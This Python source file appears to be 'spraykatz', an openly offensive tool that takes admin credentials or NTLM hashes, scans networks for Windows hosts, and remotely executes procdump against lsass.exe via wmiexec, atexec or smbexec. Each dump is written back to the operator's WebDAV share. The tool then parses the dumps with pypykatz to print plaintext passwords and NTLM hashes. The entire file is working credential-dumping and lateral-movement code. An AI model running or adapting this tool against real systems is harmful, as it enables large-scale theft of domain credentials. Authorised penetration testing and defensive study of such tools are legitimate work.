#!/usr/bin/env python3.6
# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


import os, sys

homeDir = os.path.dirname(os.path.realpath(__file__))
sys.path.insert(0, os.path.join(homeDir, 'submodules', 'impacket'))
sys.path.insert(1, os.path.join(homeDir, 'submodules', 'pywerview'))
sys.path.insert(2, os.path.join(homeDir, 'submodules', 'cme'))


# Imports
import argparse
import re
import socket
import glob
import random
import string
import time
import pexpect

from subprocess import Popen, PIPE
from multiprocessing import Process, Queue
from pypykatz.pypykatz import pypykatz

from helpers import invoke_checklocaladminaccess
from impacket.smb import SMB_DIALECT
from impacket.smbconnection import SMBConnection, SessionError
import wmiexec, atexec, smbexec


# Colors
white = '\033[97m'
green = '\033[92m'
red = '\033[91m'
yellow = '\033[93m'

# Dirs
tmpDir = os.path.join(homeDir, 'misc', 'tmp')
dumpDir = os.path.join(homeDir, 'misc', 'dumps')


def initSpraykatz():
	if not os.path.isdir(tmpDir) : os.mkdir(tmpDir)
	if not os.path.isdir(dumpDir) : os.mkdir(dumpDir)


class MyParser(argparse.ArgumentParser):
	def error(self, message):
		self.print_help()
		sys.stderr.write("\n%s[-] %sError: %s\n" % (red, white, message))
		sys.exit(2)

		
class connection:
	def __init__(self, domain, username, password):
		self.domain = domain
		self.username = username
		if re.search("([a-fA-F\d]{32}:[a-fA-F\d]{32})", password):
			self.lmhash, self.nthash = password.split(':')
			self.password = ""
		else:
			self.password = password
			self.lmhash = ""
			self.nthash = ""
		self.smbv1 = None
		self.connect = None

	def create_smbv1_conn(self, target):
		try:
			self.connect = SMBConnection(target, target, None, 445, preferredDialect=SMB_DIALECT)
			self.smbv1 = True
		except socket.error as e:
			if str(e).find('Connection reset by peer') != -1:
				print ("%s[-] %sSMBv1 might be disabled on %s%s%s" % (red, target, white))
			return False
		except Exception as e:
			#print ("%s[-] %sError creating SMBv1 connection to %s%s%s: %s" % (red, white, red, target, white, e))
			return False
		return True

	def create_smbv3_conn(self, target):
		try:
			self.connect = SMBConnection(target, target, None, 445)
			self.smbv1 = False
		except socket.error:
			return False
		except Exception as e:
			print ("%s[-] %sError creating SMBv3 connection to %s%s%s: %s" % (red, white, red, target, white, e))
			return False
		return True

	def create_conn_obj(self, target):
		if self.create_smbv1_conn(target):
			return True
		elif self.create_smbv3_conn(target):
			return True
		return False


def launchDavServer(q):
	try:
		print ("%s[+] %sStarting WebDAV Server." % (green, white))
		child = pexpect.spawn('wsgidav --host=0.0.0.0 --port=80 --root=misc --auth=anonymous --server=gevent', timeout=10)
		child.expect('Serving on ')
		st = child.read_nonblocking(timeout=2)
	except pexpect.TIMEOUT:
		print ("%s[~]   %sWebDAV Server successfuly launched." % (yellow, white))
		q.put(0)
		child.expect(pexpect.EOF, timeout=None)
		child.close()
		exit()
	except KeyboardInterrupt:
		print ("%s[-]   %sKeyboard interrupt. Exiting WebDAV Server..." % (red, white))
		q.put(1337)
	except:
		q.put(1337)
	finally:
		print ("%s[-] %sA problem occurs when launching WebDAV server. Common problems:\n\t- port 80 is already in use ?\n\t- You don't have enough privileges\n" % (red, white))
		q.put(1337)
		child.close()


def printBanner():
	''' Print the tool banner '''
	os.system("clear")
	print ("")
	print ("███████╗██████╗ ██████╗  █████╗ ██╗   ██╗██╗  ██╗ █████╗ ████████╗███████╗")
	print ("██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝██║ ██╔╝██╔══██╗╚══██╔══╝╚══███╔╝")
	print ("███████╗██████╔╝██████╔╝███████║ ╚████╔╝ █████╔╝ ███████║   ██║     ███╔╝ ")
	print ("╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  ██╔═██╗ ██╔══██║   ██║    ███╔╝  ")
	print ("███████║██║     ██║  ██║██║  ██║   ██║   ██║  ██╗██║  ██║   ██║   ███████╗")
	print ("╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝%sv0.1%s" % (green, white))
	print ("                                                                          ")
	print ("                    Written by %s@lydericlefebvre%s                       " % (red, white))
	print ("")                                                            


def retrieveMyIP():
	return (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0]


def listSmbTargets(args_targets):
	''' List targetable machines '''
	smbTargets = Popen("nmap -T4 -Pn -n --open -p135 -oG - %s | awk '$NF~/msrpc/{print $2}'" % (' '.join(args_targets)), stdout=PIPE, shell=True).communicate()[0].decode("utf8").strip().split()
	if not smbTargets:
		print ("%s[-] %sNo targets with open port 135 available. Quitting." % (red, white))
		exit(2)
	return smbTargets


def listPwnableTargets(args_targets, conn):
	print ("%s[+] %sListing targetable machines into networks provided. Be patient." % (green, white))

	pwnableTargets = []
	targets = []

	for smbTarget in listSmbTargets(args_targets):
		try:
			if invoke_checklocaladminaccess(smbTarget, conn.domain, conn.username, conn.password, conn.lmhash, conn.nthash):
				print("%s[~]%s   %s is %spwnable%s!" % (yellow, white, smbTarget, green, white))
				pwnableTargets.append(smbTarget)
		except:
			continue

	if not pwnableTargets:
		print ("%s[-] %sNo pwnable targets. Quitting." % (red, white))
		exit(2)
	return pwnableTargets


def sprayLove(conn, targets, methods, share):
	print ("%s[+] %sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s." % (green, white, green, white))

	if not methods : methods = ['wmiexec', 'atexec', 'smbexec']
	smb_share_name = ''.join(random.sample(string.ascii_letters, 5))

	for target in targets:

		if conn.create_conn_obj(target):
	
			payload = "net use \\\\%s\\procdump\\ && \\\\%s\\procdump\\procdump64.exe -accepteula -ma lsass.exe \\\\%s\\dumps\\%s.dmp" % (retrieveMyIP(), retrieveMyIP(), retrieveMyIP(), target)
			exec_method = None

			for method in methods:
				if method == 'wmiexec':
					try:
						exec_method = wmiexec.WMIEXEC(target, smb_share_name, conn.username, conn.password, conn.domain, conn.connect, conn.lmhash + ':' + conn.nthash, share)
						print("%s[~]%s   %s: %swmiexec%s seems to be an %sOK%s method. let's go... " % (yellow, white, target, green, white, green, white))
						break
					except:
						print("%s[~]%s   %s: %swmiexec%s seems to be an %sKO%s method." % (yellow, white, target, red, white, red, white))
						continue

					'''
					TODO
					elif method == 'mmcexec':
						try:
							exec_method = mmcexec.MMCEXEC(target, smb_share_name, conn.username, conn.password, conn.domain, conn.connect, conn.lmhash + ':' + conn.nthash)
							print("%s[~]%s   %s: %smmcexec%s seems to be an %sOK%s method. let's go... " % (yellow, white, target, green, white, green, white))
							break
						except:
							print("%s[~]%s   %s: %smmcexec%s seems to be an %sKO%s method." % (yellow, white, target, red, white, red, white))
							continue
					'''

				elif method == 'atexec':
					try:
						exec_method = atexec.TSCH_EXEC(target, smb_share_name, conn.username, conn.password, conn.domain, conn.lmhash + ':' + conn.nthash) #self.args.share)
						print("%s[~]%s   %s: %satexec%s seems to be an %sOK%s method. let's go... " % (yellow, white, target, green, white, green, white))
						break
					except:
						print("%s[~]%s   %s: %satexec%s seems to be an %sKO%s method." % (yellow, white, target, red, white, red, white))
						continue

				else:
					try:
						exec_method = smbexec.SMBEXEC(target, smb_share_name, 445, conn.username, conn.password, conn.domain, conn.lmhash + ':' + conn.nthash, share)
						print("%s[~]%s   %s: %ssmbexec%s seems to be an %sOK%s method. let's go... " % (yellow, white, target, green, white, green, white))
						break
					except:
						print("%s[~]%s   %s: %ssmbexec%s seems to be an %sKO%s method." % (yellow, white, target, red, white, red, white))
						continue

			if exec_method : output = u'{}'.format(exec_method.execute(payload, output=True).strip())

		else:
			print("%s[-]%s   %s: %sFailed to create a SMB Connection. Aborting." % (red, white, target, red, white))


def skip_duplicates(iterable, key=lambda x: x):
	fingerprints = set()
	for x in iterable:
		fingerprint = key(x)
		if fingerprint not in fingerprints:
			yield x
			fingerprints.add(fingerprint)


def parseDumps(dumpFolder):
	print ("%s[+] %sParsing every minidump of %smisc/dumps%s." % (green, white, green, white))

	credentials = []
	results = {}
	dico = {}

	globdata = os.path.join(dumpDir, '*.dmp')
	
	for filename in glob.glob(globdata):
		try:
			mimi = pypykatz.parse_minidump_file(filename)
			results[filename] = mimi
			print("%s[~]%s   %s: %sdone%s." % (yellow, white, filename, green, white))
		except:
			print("%s[-]%s   Parsing %sfailed%s on %s%s%s." % (red, white, red, white, red, filename, white))

	for result in results:
		for luid in results[result].logon_sessions:
			dico = results[result].logon_sessions[luid].to_dict()

			for cred in results[result].logon_sessions[luid].msv_creds:
				credentials.append((cred.domainname, cred.username, 'NA', (cred.LMHash.hex() if cred.LMHash else 'NA'), (cred.NThash.hex() if cred.NThash else 'NA')))

			for cred in results[result].logon_sessions[luid].wdigest_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domainname, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].ssp_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domainname, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].livessp_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domainname, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].kerberos_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domainname, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].credman_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.domain, cred.username, cred.password, 'NA', 'NA'))

			for cred in results[result].logon_sessions[luid].tspkg_creds:
				if cred.password and "TBAL" not in cred.password:
					credentials.append((cred.username, cred.domainname, cred.password, 'NA', 'NA'))

	credentials = list(skip_duplicates(credentials))
		
	print ("%s[+]%s Following %scredentials%s were retrieved:" % (green, white, green, white))
	for credential in credentials:
			print("")
			print("\t\t  domain: ", credential[0])
			print("\t\tusername: ", credential[1])
			if credential[2] is not 'NA':
				print("\t\tpassword:  %s%s%s" % (green, credential[2], white))
			if credential[3] is not 'NA':
				print("\t\t  lmhash:  %s%s%s" % (green, credential[3], white))
			if credential[4] is not 'NA':
				print("\t\t  nthash:  %s%s%s" % (green, credential[4], white))


def parseArgs(parser):
	args = parser.parse_args()
	if args.methods:
		args.methods = args.methods.split(',')
	if os.path.isfile(args.targets):
		args.targets = [line.rstrip('\n') for line in open(args.targets)]
	else:
		args.targets = args.targets.split(',')
	return args


def run(args):
	q = Queue()
	davServer = Process(target=launchDavServer, args=(q,))
	
	try:
		conn = connection(args.domain, args.username, args.password)
		targets = listPwnableTargets(args.targets, conn)
		davServer.start()

		if q.get() == 0:
			sprayLove(conn, targets, args.methods, args.share)
			print ("%s[+]%s Waiting 10 seconds to gather every dump..." % (green, white))
			time.sleep(10)
			parseDumps(dumpDir)
	except:
		pass

	print ("\nExiting...")

	if davServer.is_alive():
		davServer.terminate()

	for f in os.listdir(tmpDir):
		os.remove(os.path.join(tmpDir, f))

	for f in os.listdir(dumpDir):
			os.remove(os.path.join(dumpDir, f))


if __name__ == '__main__':
	
	# Positional arguments
	parser = MyParser(prog="spraykatz.py", description="A tool to spray love around the world! [v0.1]", epilog="Example : ./spraykatz.py -d domain.local -u localadmin -p L0c4l4dm1n -t 192.168.10.60,192.168.0.0/24 -m atexec")
	parser.add_argument("-d", "--domain", help="Targeted domain. Use a dot in case there is no domain.", required=False, default='.')
	parser.add_argument("-u", "--username", help="Username to spray. The user must have admin rights on targeted systems.", required=True)
	parser.add_argument("-p", "--password", help="User's password or NTLM hash (LM:NT format) used for spraying.", required=True)
	parser.add_argument("-t", "--targets", help="Targets. Can be a list of IP addresses or Ranges separated by commas (example: 192.168.10.60,192.168.20.0/24,etc), or a targets file containing one IP/Range per line.", required=True)
	parser.add_argument("-m", "--methods", help="Methods used for spraying. Can be wmiexec, atexec or smbexec. Default: wmiexec.", choices=['wmiexec', 'atexec', 'smbexec'], default=None)
	parser.add_argument("-s", "--share", help="Specify a share (default: C$).", default="C$")

	# Run!
	printBanner()
	args = parseArgs(parser)
	initSpraykatz()
	run(args)
